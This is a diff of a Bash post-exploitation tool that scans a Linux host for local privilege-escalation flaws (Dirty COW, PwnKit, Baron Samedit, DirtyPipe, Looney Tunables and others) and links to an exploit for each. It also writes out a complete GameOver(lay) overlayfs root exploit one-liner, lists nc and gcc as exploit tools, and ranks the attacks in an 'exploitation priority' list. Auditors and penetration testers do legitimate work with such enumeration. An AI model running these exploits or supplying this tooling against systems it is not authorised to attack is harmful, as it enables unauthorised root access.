+    kernel_minor=$(echo "$kernel_version" | cut -d. -f2)
+    kernel_patch=$(echo "$kernel_version" | cut -d. -f3 | cut -d- -f1)
+    
+    echo "--- Kernel Version Breakdown ---" >>"$output_file"
+    echo "Major: $kernel_major" >>"$output_file"
+    echo "Minor: $kernel_minor" >>"$output_file"
+    echo "Patch: $kernel_patch" >>"$output_file"
+    echo "" >>"$output_file"
 
-    # Dirty COW (CVE-2016-5195)
-    if [[ "$kernel_version" =~ ^2\.6\. ]] || [[ "$kernel_version" =~ ^3\. ]] || ([[ "$kernel_version" =~ ^4\. ]] && [[ "${kernel_version:2:2}" -lt "8" ]]); then
-        echo "[+] Potentially vulnerable to Dirty COW (CVE-2016-5195)" >>"$output_file"
-        echo "    https://dirtycow.ninja/" >>"$output_file"
-        echo "    Exploit: https://github.com/FireFart/dirtycow/blob/master/dirty.c" >>"$output_file"
-    fi
+    # Initialize vulnerability tracking arrays
+    vuln_count=0
+    declare -a found_vulns=()
+    declare -a vuln_details=()
 
-    # Sudo Baron Samedit (CVE-2021-3156)
-    if sudo -V 2>/dev/null | grep -E "Sudo version (1\.(8\.[0-9]|9\.[0-5])|1\.9\.5p1)" >/dev/null; then
-        echo "[+] Potentially vulnerable to Sudo Baron Samedit (CVE-2021-3156)" >>"$output_file"
-        echo "    Exploit: https://github.com/blasty/CVE-2021-3156" >>"$output_file"
-    fi
+    # Function to compare kernel versions
+    version_compare() {
+        local current_major=$1
+        local current_minor=$2
+        local current_patch=$3
+        local vuln_major=$4
+        local vuln_minor=$5
+        local vuln_patch=$6
+        
+        # Convert to comparable numbers
+        local current_num=$((current_major * 10000 + current_minor * 100 + current_patch))
+        local vuln_num=$((vuln_major * 10000 + vuln_minor * 100 + vuln_patch))
+        
+        if [ "$current_num" -le "$vuln_num" ]; then
+            return 0  # Vulnerable
+        else
+            return 1  # Not vulnerable
+        fi
+    }
 
-    # Polkit pkexec (CVE-2021-4034)
-    if [ -f "/usr/bin/pkexec" ] && [ -u "/usr/bin/pkexec" ]; then
-        pkexec_version=$(pkexec --version 2>&1 | grep -oP 'pkexec version \K[0-9.]+')
-        if [[ -z "$pkexec_version" ]] || [[ "$pkexec_version" < "0.120" ]]; then
-            echo "[+] Potentially vulnerable to Polkit pkexec (CVE-2021-4034)" >>"$output_file"
-            echo "    Exploit: https://github.com/berdav/CVE-2021-4034" >>"$output_file"
+    # Function to add vulnerability to tracking arrays
+    add_vulnerability() {
+        local vuln_name="$1"
+        local vuln_detail="$2"
+        found_vulns+=("$vuln_name")
+        vuln_details+=("$vuln_detail")
+        vuln_count=$((vuln_count + 1))
+    }
+
+    echo "--- Known Kernel Vulnerabilities ---" >>"$output_file"
+
+    # Dirty COW (CVE-2016-5195) - Expanded check
+    if version_compare "$kernel_major" "$kernel_minor" "$kernel_patch" 4 8 3; then
+        if [[ "$kernel_version" =~ ^2\.6\. ]] || [[ "$kernel_version" =~ ^3\. ]] || ([[ "$kernel_version" =~ ^4\. ]] && [[ "${kernel_patch}" -lt "9" ]]); then
+            echo "[+] CRITICAL: Potentially vulnerable to Dirty COW (CVE-2016-5195)" >>"$output_file"
+            echo "    Affected: Linux kernel 2.6.22 - 4.8.3" >>"$output_file"
+            echo "    Impact: Local privilege escalation via copy-on-write" >>"$output_file"
+            echo "    CVSS Score: 7.8 (High)" >>"$output_file"
+            echo "    Exploit: https://dirtycow.ninja/" >>"$output_file"
+            echo "    PoC: https://github.com/FireFart/dirtycow/blob/master/dirty.c" >>"$output_file"
+            echo "    Test: echo 'this is not a test' > /tmp/foo && cp /etc/passwd /tmp/passwd.bak" >>"$output_file"
+            echo "" >>"$output_file"
+            add_vulnerability "Dirty COW (CVE-2016-5195)" "CRITICAL - Local privilege escalation via copy-on-write"
         fi
     fi
 
-    log_message "INFOS" "Kernel exploit check saved to $output_file"
+    # KASLR/SMEP Bypass (CVE-2017-5123) - waitid() 
+    if version_compare "$kernel_major" "$kernel_minor" "$kernel_patch" 4 14 0; then
+        echo "[+] HIGH: Potentially vulnerable to waitid() KASLR/SMEP bypass (CVE-2017-5123)" >>"$output_file"
+        echo "    Affected: Linux kernel < 4.14" >>"$output_file"
+        echo "    Impact: Local privilege escalation via waitid() system call" >>"$output_file"
+        echo "    CVSS Score: 7.8 (High)" >>"$output_file"
+        echo "    Exploit: https://github.com/nongiach/CVE/tree/master/CVE-2017-5123" >>"$output_file"
+        echo "" >>"$output_file"
+        add_vulnerability "waitid() KASLR/SMEP bypass (CVE-2017-5123)" "HIGH - Local privilege escalation via waitid() system call"
+    fi
+
+    # Stack Clash (CVE-2017-1000364)
+    if version_compare "$kernel_major" "$kernel_minor" "$kernel_patch" 4 11 9; then
+        echo "[+] HIGH: Potentially vulnerable to Stack Clash (CVE-2017-1000364)" >>"$output_file"
+        echo "    Affected: Linux kernel < 4.11.9" >>"$output_file"
+        echo "    Impact: Local privilege escalation via stack exhaustion" >>"$output_file"
+        echo "    CVSS Score: 7.4 (High)" >>"$output_file"
+        echo "    Exploit: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/local/stack_clash.rb" >>"$output_file"
+        echo "" >>"$output_file"
+        add_vulnerability "Stack Clash (CVE-2017-1000364)" "HIGH - Local privilege escalation via stack exhaustion"
+    fi
+
+    # DCCP Double-Free (CVE-2017-6074)
+    if version_compare "$kernel_major" "$kernel_minor" "$kernel_patch" 4 9 11; then
+        echo "[+] CRITICAL: Potentially vulnerable to DCCP Double-Free (CVE-2017-6074)" >>"$output_file"
+        echo "    Affected: Linux kernel 2.6.18 - 4.9.11" >>"$output_file"
+        echo "    Impact: Local privilege escalation via DCCP module" >>"$output_file"
+        echo "    CVSS Score: 7.8 (High)" >>"$output_file"
+        echo "    Exploit: https://github.com/xairy/kernel-exploits/tree/master/CVE-2017-6074" >>"$output_file"
+        echo "    Test: lsmod | grep dccp" >>"$output_file"
+        echo "" >>"$output_file"
+        add_vulnerability "DCCP Double-Free (CVE-2017-6074)" "CRITICAL - Local privilege escalation via DCCP module"
+    fi
+
+    # Netfilter Heap Overflow (CVE-2021-22555)
+    if version_compare "$kernel_major" "$kernel_minor" "$kernel_patch" 5 12 0; then
+        echo "[+] CRITICAL: Potentially vulnerable to Netfilter Heap Overflow (CVE-2021-22555)" >>"$output_file"
+        echo "    Affected: Linux kernel 2.6.19 - 5.12.0" >>"$output_file"
+        echo "    Impact: Local privilege escalation via netfilter" >>"$output_file"
+        echo "    CVSS Score: 7.8 (High)" >>"$output_file"
+        echo "    Exploit: https://github.com/google/security-research/tree/master/pocs/linux/cve-2021-22555" >>"$output_file"
+        echo "" >>"$output_file"
+        add_vulnerability "Netfilter Heap Overflow (CVE-2021-22555)" "CRITICAL - Local privilege escalation via netfilter"
+    fi
+
+    # eBPF Verifier (CVE-2021-3490, CVE-2021-3489, CVE-2021-3491)
+    if [[ "$kernel_major" -eq 5 ]] && [[ "$kernel_minor" -le 12 ]]; then
+        echo "[+] HIGH: Potentially vulnerable to eBPF Verifier vulnerabilities (CVE-2021-3490/3489/3491)" >>"$output_file"
+        echo "    Affected: Linux kernel 5.7 - 5.12" >>"$output_file"
+        echo "    Impact: Local privilege escalation via eBPF verifier" >>"$output_file"
+        echo "    CVSS Score: 7.8 (High)" >>"$output_file"
+        echo "    Exploit: https://github.com/chompie1337/Linux_LPE_eBPF_CVE-2021-3490" >>"$output_file"
+        echo "    Test: /proc/sys/kernel/unprivileged_bpf_disabled" >>"$output_file"
+        echo "" >>"$output_file"
+        add_vulnerability "eBPF Verifier (CVE-2021-3490/3489/3491)" "HIGH - Local privilege escalation via eBPF verifier"
+    fi
+
+    # PwnKit - Polkit pkexec (CVE-2021-4034)
+    echo "--- Checking for PwnKit (CVE-2021-4034) ---" >>"$output_file"
+    if [ -f "/usr/bin/pkexec" ]; then
+        if [ -u "/usr/bin/pkexec" ]; then
+            echo "[+] CRITICAL: pkexec binary found with SUID bit - PwnKit vulnerable!" >>"$output_file"
+            echo "    Binary: /usr/bin/pkexec" >>"$output_file"
+            echo "    Impact: Local privilege escalation to root" >>"$output_file"
+            echo "    CVSS Score: 7.8 (High)" >>"$output_file"
+            echo "    Exploit: https://github.com/berdav/CVE-2021-4034" >>"$output_file"
+            echo "    Quick Test: ls -la /usr/bin/pkexec" >>"$output_file"
+            ls -la /usr/bin/pkexec >>"$output_file" 2>/dev/null
+            echo "" >>"$output_file"
+            add_vulnerability "PwnKit (CVE-2021-4034)" "CRITICAL - Local privilege escalation to root via pkexec"
+        else
+            echo "[-] pkexec found but no SUID bit set" >>"$output_file"
+        fi
+    else
+        echo "[-] pkexec not found on system" >>"$output_file"
+    fi
+    echo "" >>"$output_file"
+
+    # Sudo Baron Samedit (CVE-2021-3156)
+    echo "--- Checking for Sudo Baron Samedit (CVE-2021-3156) ---" >>"$output_file"
+    if command -v sudo >/dev/null 2>&1; then
+        sudo_version=$(sudo -V 2>/dev/null | head -n 1 | grep -oE '[0-9]+\.[0-9]+\.[0-9]+')
+        echo "Sudo Version: $sudo_version" >>"$output_file"
+        
+        if echo "$sudo_version" | grep -E "^1\.(8\.[0-9]|9\.[0-5])" >/dev/null; then
+            echo "[+] CRITICAL: Potentially vulnerable to Sudo Baron Samedit (CVE-2021-3156)" >>"$output_file"
+            echo "    Affected: sudo 1.8.2 - 1.8.31p2, 1.9.0 - 1.9.5p1" >>"$output_file"
+            echo "    Impact: Local privilege escalation via sudo heap overflow" >>"$output_file"
+            echo "    CVSS Score: 7.8 (High)" >>"$output_file"
+            echo "    Exploit: https://github.com/blasty/CVE-2021-3156" >>"$output_file"
+            echo "    Test: sudoedit -s /nonexistent" >>"$output_file"
+            echo "" >>"$output_file"
+            add_vulnerability "Sudo Baron Samedit (CVE-2021-3156)" "CRITICAL - Local privilege escalation via sudo heap overflow"
+        else
+            echo "[-] Sudo version appears to be patched" >>"$output_file"
+        fi
+    else
+        echo "[-] sudo not found on system" >>"$output_file"
+    fi
+    echo "" >>"$output_file"
+
+    # DirtyPipe (CVE-2022-0847)
+    if [[ "$kernel_major" -eq 5 ]] && [[ "$kernel_minor" -ge 8 ]] && version_compare "$kernel_major" "$kernel_minor" "$kernel_patch" 5 16 11; then
+        echo "[+] CRITICAL: Potentially vulnerable to DirtyPipe (CVE-2022-0847)" >>"$output_file"
+        echo "    Affected: Linux kernel 5.8 - 5.16.11, 5.15.25, 5.10.102" >>"$output_file"
+        echo "    Impact: Local privilege escalation via pipe vulnerability" >>"$output_file"
+        echo "    CVSS Score: 7.8 (High)" >>"$output_file"
+        echo "    Exploit: https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits" >>"$output_file"
+        echo "    Test: Check for pipe functionality" >>"$output_file"
+        echo "" >>"$output_file"
+        add_vulnerability "DirtyPipe (CVE-2022-0847)" "CRITICAL - Local privilege escalation via pipe vulnerability"
+    fi
+
+    # GameOver(lay) - CVE-2023-2640 & CVE-2023-32629
+    echo "--- Checking for GameOver(lay) Ubuntu Privilege Escalation ---" >>"$output_file"
+    if grep -qi ubuntu /etc/os-release 2>/dev/null; then
+        ubuntu_version=$(grep VERSION_ID /etc/os-release 2>/dev/null | cut -d'"' -f2)
+        echo "Ubuntu Version: $ubuntu_version" >>"$output_file"
+        
+        # Check if it's a vulnerable Ubuntu version
+        if [[ "$ubuntu_version" =~ ^(20\.04|22\.04|23\.04) ]]; then
+            echo "[+] HIGH: Potentially vulnerable to GameOver(lay) Ubuntu exploit" >>"$output_file"
+            echo "    CVE: CVE-2023-2640 & CVE-2023-32629" >>"$output_file"
+            echo "    Affected: Ubuntu 20.04, 22.04, 23.04" >>"$output_file"
+            echo "    Impact: Local privilege escalation via overlayfs" >>"$output_file"
+            echo "    CVSS Score: 7.8 (High)" >>"$output_file"
+            echo "    Exploit: unshare -rm sh -c \"mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*; u/python3 -c 'import os;os.setuid(0);os.system(\\\"id\\\")'\""  >>"$output_file"
+            echo "    Reference: https://www.wiz.io/blog/ubuntu-overlayfs-vulnerability" >>"$output_file"
+            echo "" >>"$output_file"
+            add_vulnerability "GameOver(lay) (CVE-2023-2640 & CVE-2023-32629)" "HIGH - Local privilege escalation via overlayfs on Ubuntu"
+        fi
+    else
+        echo "[-] Not running Ubuntu" >>"$output_file"
+    fi
+    echo "" >>"$output_file"
+
+    # Looney Tunables (CVE-2023-4911)
+    echo "--- Checking for Looney Tunables (CVE-2023-4911) ---" >>"$output_file"
+    if [ -f "/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2" ] || [ -f "/lib64/ld-linux-x86-64.so.2" ]; then
+        # Check glibc version
+        glibc_version=$(ldd --version 2>/dev/null | head -n1 | grep -oE '[0-9]+\.[0-9]+')
+        echo "GLIBC Version: $glibc_version" >>"$output_file"
+        
+        if [[ -n "$glibc_version" ]]; then
+            # Vulnerable versions: glibc 2.34 to 2.38
+            if [[ "$glibc_version" =~ ^2\.(3[4-8]) ]]; then
+                echo "[+] CRITICAL: Potentially vulnerable to Looney Tunables (CVE-2023-4911)" >>"$output_file"
+                echo "    Affected: glibc 2.34 - 2.38" >>"$output_file"
+                echo "    Impact: Local privilege escalation via GLIBC_TUNABLES" >>"$output_file"
+                echo "    CVSS Score: 7.8 (High)" >>"$output_file"
+                echo "    Exploit: https://github.com/leesh3288/CVE-2023-4911" >>"$output_file"
+                echo "    Test: env GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=A /bin/true" >>"$output_file"
+                echo "" >>"$output_file"
+                add_vulnerability "Looney Tunables (CVE-2023-4911)" "CRITICAL - Local privilege escalation via GLIBC_TUNABLES"
+            fi
+        fi
+    else
+        echo "[-] Could not determine GLIBC version" >>"$output_file"
+    fi
+    echo "" >>"$output_file"
+
+    # Additional checks for kernel configuration
+    echo "--- Kernel Security Features Check ---" >>"$output_file"
+    
+    # Check KASLR
+    if [ -f "/proc/sys/kernel/randomize_va_space" ]; then
+        kaslr_status=$(cat /proc/sys/kernel/randomize_va_space)
+        if [ "$kaslr_status" -eq 2 ]; then
+            echo "[+] KASLR: Enabled (randomize_va_space = 2)" >>"$output_file"
+        elif [ "$kaslr_status" -eq 1 ]; then
+            echo "[!] KASLR: Partially enabled (randomize_va_space = 1)" >>"$output_file"
+        else
+            echo "[-] KASLR: Disabled (randomize_va_space = 0) - VULNERABLE" >>"$output_file"
+            add_vulnerability "KASLR Disabled" "MEDIUM - Address space layout randomization disabled"
+        fi
+    fi
+    
+    # Check SMEP/SMAP
+    if [ -f "/proc/cpuinfo" ]; then
+        if grep -q smep /proc/cpuinfo; then
+            echo "[+] SMEP: CPU supports SMEP" >>"$output_file"
+        else
+            echo "[-] SMEP: CPU does not support SMEP" >>"$output_file"
+        fi
+        
+        if grep -q smap /proc/cpuinfo; then
+            echo "[+] SMAP: CPU supports SMAP" >>"$output_file"
+        else
+            echo "[-] SMAP: CPU does not support SMAP" >>"$output_file"
+        fi
+    fi
+    
+    # Check NX bit
+    if grep -q nx /proc/cpuinfo; then
+        echo "[+] NX: CPU supports NX bit" >>"$output_file"
+    else
+        echo "[-] NX: CPU does not support NX bit" >>"$output_file"
+    fi
+    
+    # Check for kptr_restrict
+    if [ -f "/proc/sys/kernel/kptr_restrict" ]; then
+        kptr_status=$(cat /proc/sys/kernel/kptr_restrict)
+        if [ "$kptr_status" -eq 2 ]; then
+            echo "[+] KPTR: Kernel pointers hidden from all users" >>"$output_file"
+        elif [ "$kptr_status" -eq 1 ]; then
+            echo "[!] KPTR: Kernel pointers hidden from non-root" >>"$output_file"
+        else
+            echo "[-] KPTR: Kernel pointers visible - potential info leak" >>"$output_file"
+        fi
+    fi
+    
+    # Check dmesg restrictions
+    if [ -f "/proc/sys/kernel/dmesg_restrict" ]; then
+        dmesg_status=$(cat /proc/sys/kernel/dmesg_restrict)
+        if [ "$dmesg_status" -eq 1 ]; then
+            echo "[+] DMESG: Restricted to privileged users" >>"$output_file"
+        else
+            echo "[-] DMESG: Accessible by unprivileged users" >>"$output_file"
+        fi
+    fi
+    echo "" >>"$output_file"
+
+    # Check for available exploit tools
+    echo "--- Exploit Development Tools Check ---" >>"$output_file"
+    exploit_tools=("gcc" "make" "python" "python3" "perl" "ruby" "nc" "ncat" "netcat")
+    available_tools=""
+    
+    for tool in "${exploit_tools[@]}"; do
+        if command -v "$tool" >/dev/null 2>&1; then
+            available_tools="$available_tools $tool"
+        fi
+    done
+    
+    if [ -n "$available_tools" ]; then
+        echo "[+] Available development tools:$available_tools" >>"$output_file"
+        echo "    These tools can be used to compile and run exploits" >>"$output_file"
+    else
+        echo "[-] No development tools found" >>"$output_file"
+        echo "    This may limit exploit capabilities" >>"$output_file"
+    fi
+    echo "" >>"$output_file"
+
+    # Generate summary and recommendations
+    echo "===========================================" >>"$output_file"
+    echo "           VULNERABILITY SUMMARY" >>"$output_file"
+    echo "===========================================" >>"$output_file"
+    echo "Total vulnerabilities found: $vuln_count" >>"$output_file"
+    echo "" >>"$output_file"
+    
+    if [ "$vuln_count" -gt 0 ]; then
+        echo "IDENTIFIED VULNERABILITIES:" >>"$output_file"
+        echo "----------------------------" >>"$output_file"
+        for i in "${!found_vulns[@]}"; do
+            echo "$((i+1)). ${found_vulns[i]}" >>"$output_file"
+            echo "   ${vuln_details[i]}" >>"$output_file"
+            echo "" >>"$output_file"
+        done
+        
+        echo "[!] SECURITY RECOMMENDATIONS:" >>"$output_file"
+        echo "1. Update the kernel to the latest stable version" >>"$output_file"
+        echo "2. Apply all available security patches" >>"$output_file"
+        echo "3. Consider using a distribution with regular security updates" >>"$output_file"
+        echo "4. Enable additional kernel hardening features if available" >>"$output_file"
+        echo "" >>"$output_file"
+        
+        echo "[!] EXPLOITATION PRIORITY:" >>"$output_file"
+        echo "1. Check PwnKit (CVE-2021-4034) first - often most reliable" >>"$output_file"
+        echo "2. Try Sudo Baron Samedit (CVE-2021-3156) if sudo is available" >>"$output_file"
+        echo "3. Attempt DirtyPipe (CVE-2022-0847) for newer kernels" >>"$output_file"
+        echo "4. Consider Dirty COW (CVE-2016-5195) for older systems" >>"$output_file"
+        echo "5. GameOver(lay) for Ubuntu systems" >>"$output_file"
+        echo "6. Looney Tunables (CVE-2023-4911) for systems with vulnerable glibc" >>"$output_file"
+    else
+        echo "[+] No obvious kernel vulnerabilities detected" >>"$output_file"
+        echo "    The system appears to have updated kernel security patches" >>"$output_file"
+        echo "    Consider other privilege escalation vectors (SUID, sudo, etc.)" >>"$output_file"
+    fi
+    echo "===========================================" >>"$output_file"
+
+    log_message "INFOS" "Kernel exploit analysis saved to $output_file"
+    log_message "INFOS" "Found $vuln_count potential vulnerabilities"
+    
+    # Also print summary to console
+    if [ "$vuln_count" -gt 0 ]; then
+        echo "=== VULNERABILITY SUMMARY ==="
+        for i in "${!found_vulns[@]}"; do
+            echo "$((i+1)). ${found_vulns[i]}"
+        done
+        echo "Total: $vuln_count vulnerabilities found"
+    else
+        echo "No obvious vulnerabilities detected"
+    fi
+    
     return 0
 }
 
@@ -2453,6 +3180,7 @@ restore_defaults() {
 # ----------------------------------------------------------------------
 
 # Display banner if not in quiet mode
+# Display banner if not in quiet mode
 if [ "$QUIET_MODE" = false ]; then
     echo -e "\e[1;31m"
     echo "███████╗███████╗ ██████╗ █████╗ ██╗      █████╗ ████████╗███████╗██╗  ██╗██╗████████╗"
@@ -2465,9 +3193,14 @@ if [ "$QUIET_MODE" = false ]; then
     echo -e "\e[1;32mPost-Exploitation Automation Tool v$VERSION\e[0m"
     echo -e "\e[1;34mAuthor: K4YR0\e[0m"
     
-    # Show root status
-    if [ "$(id -u)" -eq 0 ]; then
-        echo -e "\e[1;31m[!] Running with ROOT privileges\e[0m"
+    # Show current user status instead of root status
+    current_user=$(whoami)
+    current_uid=$(id -u)
+    
+    if [ "$current_uid" -eq 0 ]; then
+        echo -e "\e[1;33m[!] Currently running as ROOT - privilege escalation not needed\e[0m"
+    else
+        echo -e "\e[1;32m[+] Running as user: $current_user (UID: $current_uid) - ready for privilege escalation\e[0m"
     fi
     
     echo -e "\e[0m"
